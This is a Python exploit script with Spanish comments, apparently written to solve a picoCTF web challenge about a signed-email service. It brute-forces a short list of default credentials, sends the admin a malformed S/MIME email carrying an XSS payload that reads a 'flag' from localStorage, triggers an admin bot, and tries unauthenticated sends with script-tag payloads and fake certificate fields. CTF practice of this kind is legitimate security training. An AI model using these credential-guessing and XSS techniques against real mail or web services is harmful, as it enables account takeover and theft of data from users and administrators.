#!/usr/bin/env python3
import requests
import base64

URL = "http://activist-birds.picoctf.net:63813"

# Intentar con un email pre-firmado malformado
malformed_email = """MIME-Version: 1.0
Content-Type: multipart/signed; protocol="application/pkcs7-signature"; micalg="sha-256"; boundary="boundary"

--boundary
Content-Type: text/html

<img src=x onerror="alert(localStorage.getItem('flag'))">

--boundary
Content-Type: application/pkcs7-signature; name="smime.p7s"
Content-Transfer-Encoding: base64

FAKE_SIGNATURE_HERE

--boundary--
"""

# Intentar login con credenciales conocidas o por defecto
creds = [
    ("user@ses", "already seen"),
    ("user@ses", "password"),
    ("user@ses", "user@ses"),
    ("admin@ses", "admin"),
    ("admin@ses", "admin@ses"),
    ("test@ses", "test")
]

for username, password in creds:
    r = requests.post(f"{URL}/api/login", json={"username": username, "password": password})
    if r.status_code == 200:
        print(f"LOGIN SUCCESS: {username}:{password}")
        token = r.json()
        headers = {"Authorization": f"Bearer {token}"}
        
        # Enviar email malformado
        r = requests.post(f"{URL}/api/send", headers=headers, json={
            "to": "admin@ses",
            "subject": "Test",
            "body": malformed_email
        })
        print(f"Sent malformed: {r.status_code}")
        
        # Trigger admin
        r = requests.post(f"{URL}/api/admin_bot", headers=headers)
        print(f"Admin triggered: {r.status_code}")
        
        break

# Intentar enviar directamente a la API sin autenticación
print("\n[*] Trying direct API access...")
r = requests.post(f"{URL}/api/send", json={
    "to": "admin@ses",
    "subject": "Test",
    "body": "<script>alert(1)</script>"
})
print(f"Direct send: {r.status_code} - {r.text[:100]}")

# Intentar con certificado en el body directamente
cert_payload = {
    "to": "admin@ses",
    "subject": "Test",
    "body": "test",
    "cert": "-----BEGIN CERTIFICATE-----\nFAKE\n-----END CERTIFICATE-----",
    "key": "-----BEGIN PRIVATE KEY-----\nFAKE\n-----END PRIVATE KEY-----"
}
r = requests.post(f"{URL}/api/send", json=cert_payload)
print(f"With cert: {r.status_code} - {r.text[:100]}")